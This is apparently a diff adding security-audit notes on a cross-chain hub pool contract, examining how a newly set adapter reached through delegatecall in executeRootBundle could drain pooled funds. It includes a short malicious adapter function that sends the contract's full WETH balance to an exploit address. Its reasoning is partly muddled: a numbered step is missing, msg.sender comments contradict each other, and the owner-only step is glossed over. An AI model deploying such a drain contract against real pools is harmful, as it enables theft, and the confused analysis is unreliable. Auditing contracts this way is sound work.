@@ -69,3 +69,149 @@ contract Attack {
 > _updateAccumulatedLpFees(pooledToken) and _sync(l1Token) don't affect on exchangeRate, if only haircutReserves() was called
         
 
+
+### setCrossChainContracts
+
+```solidity
+    function setCrossChainContracts(
+        uint256 l2ChainId,
+        address adapter,
+        address spokePool
+    ) public override onlyOwner nonReentrant {
+        crossChainContracts[l2ChainId] = CrossChainContract(adapter, spokePool);
+        emit CrossChainContractsSet(l2ChainId, adapter, spokePool);
+    }
+```
+
+Here we can withdraw all tokens: here we do adapter.delegatecall.
+
+```
+call trace:                                who calls
+setCrossChainContracts                                 msg.sender = owner
+executeRootBundle                                      msg.sender = attacker(EOA)
+    _sendTokensToChainAndUpdatePooledTokenTrackers     msg.sender = attacker(EOA)
+        (bool success, ) = adapter.delegatecall(       msg.sender = attacker(EOA)
+                    abi.encodeWithSignature(
+                        "relayTokens(address,address,uint256,address)",
+                        l1Token, // l1Token.
+                        l2Token, // l2Token.
+                        uint256(netSendAmounts[i]), // amount.
+                        spokePool // to. This should be the spokePool.
+                    )
+                );
+```
+
+Possible attack vector in single transaction (all liquidity is on Hub contract):
+1. set new `adapter` in setCrossChainContracts
+3. attacker calls executeRootBundle(inside we call internal function _sendTokensToChainAndUpdatePooledTokenTrackers()):
+4. in `adapter`.delegatecall (in context of msg.sender - attacker):
+
+```solidity
+// this function is defined in new adapter contract
+address immutable private EXPLOIT_ADDRESS
+function relayTokens(address,address,uint256,address) {
+    // here is msg.sender is still attacker
+    IERC20 token = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    token.transfer(EXPLOIT_ADDRESS, token.balanceOf(address(this))); // msg.sender in approve is HUB
+}
+```
+
+```solidity
+    function executeRootBundle(
+        uint256 chainId,
+        uint256 groupIndex,
+        uint256[] memory bundleLpFees,
+        int256[] memory netSendAmounts,
+        int256[] memory runningBalances,
+        uint8 leafId,
+        address[] memory l1Tokens,
+        bytes32[] calldata proof
+    ) public nonReentrant unpaused {
+        require(getCurrentTime() > rootBundleProposal.challengePeriodEndTimestamp, "Not passed liveness");
+
+        // Verify the leafId in the poolRebalanceLeaf has not yet been claimed.
+        require(!MerkleLib.isClaimed1D(rootBundleProposal.claimedBitMap, leafId), "Already claimed");
+
+        // Verify the props provided generate a leaf that, along with the proof, are included in the merkle root.
+        require(
+            MerkleLib.verifyPoolRebalance(
+                rootBundleProposal.poolRebalanceRoot,
+                PoolRebalanceLeaf({
+                    chainId: chainId,
+                    groupIndex: groupIndex,
+                    bundleLpFees: bundleLpFees,
+                    netSendAmounts: netSendAmounts,
+                    runningBalances: runningBalances,
+                    leafId: leafId,
+                    l1Tokens: l1Tokens
+                }),
+                proof
+            ),
+            "Bad Proof"
+        );
+        // Grouping code that uses adapter and spokepool to avoid stack too deep warning.
+        // Get cross chain helpers for leaf's destination chain ID. This internal method will revert if either helper
+        // is set improperly.
+        (address adapter, address spokePool) = _getInitializedCrossChainContracts(chainId);
+
+        // Set the leafId in the claimed bitmap.
+        rootBundleProposal.claimedBitMap = MerkleLib.setClaimed1D(rootBundleProposal.claimedBitMap, leafId);
+
+        // Decrement the unclaimedPoolRebalanceLeafCount.
+        --rootBundleProposal.unclaimedPoolRebalanceLeafCount;
+
+        // Relay each L1 token to destination chain.
+        // Note: if any of the keccak256(l1Tokens, chainId) combinations are not mapped to a destination token address,
+        // then this internal method will revert. In this case the admin will have to associate a destination token
+        // with each l1 token. If the destination token mapping was missing at the time of the proposal, we assume
+        // that the root bundle would have been disputed because the off-chain data worker would have been unable to
+        // determine if the relayers used the correct destination token for a given origin token.
+        _sendTokensToChainAndUpdatePooledTokenTrackers(
+            adapter,
+            spokePool,
+            chainId,
+            l1Tokens,
+            netSendAmounts,
+            bundleLpFees
+        );
+
+        // Check bool used by data worker to prevent relaying redundant roots to SpokePool.
+        if (groupIndex == 0) {
+            // Relay root bundles to spoke pool on destination chain by
+            // performing delegatecall to use the adapter's code with this contract's context.
+
+            // We are ok with this low-level call since the adapter address is set by the admin and we've
+            // already checked that its not the zero address.
+            // solhint-disable-next-line avoid-low-level-calls
+            (bool success, ) = adapter.delegatecall(
+                abi.encodeWithSignature(
+                    "relayMessage(address,bytes)",
+                    spokePool, // target. This should be the spokePool on the L2.
+                    abi.encodeWithSignature(
+                        "relayRootBundle(bytes32,bytes32)",
+                        rootBundleProposal.relayerRefundRoot,
+                        rootBundleProposal.slowRelayRoot
+                    ) // message
+                )
+            );
+            require(success, "delegatecall failed");
+        }
+
+        // Transfer the bondAmount back to the proposer, if this the last executed leaf. Only sending this once all
+        // leaves have been executed acts to force the data worker to execute all bundles or they won't receive their bond.
+        if (rootBundleProposal.unclaimedPoolRebalanceLeafCount == 0)
+            bondToken.safeTransfer(rootBundleProposal.proposer, bondAmount);
+
+        emit RootBundleExecuted(
+            groupIndex,
+            leafId,
+            chainId,
+            l1Tokens,
+            bundleLpFees,
+            netSendAmounts,
+            runningBalances,
+            msg.sender
+        );
+    }
+
+```
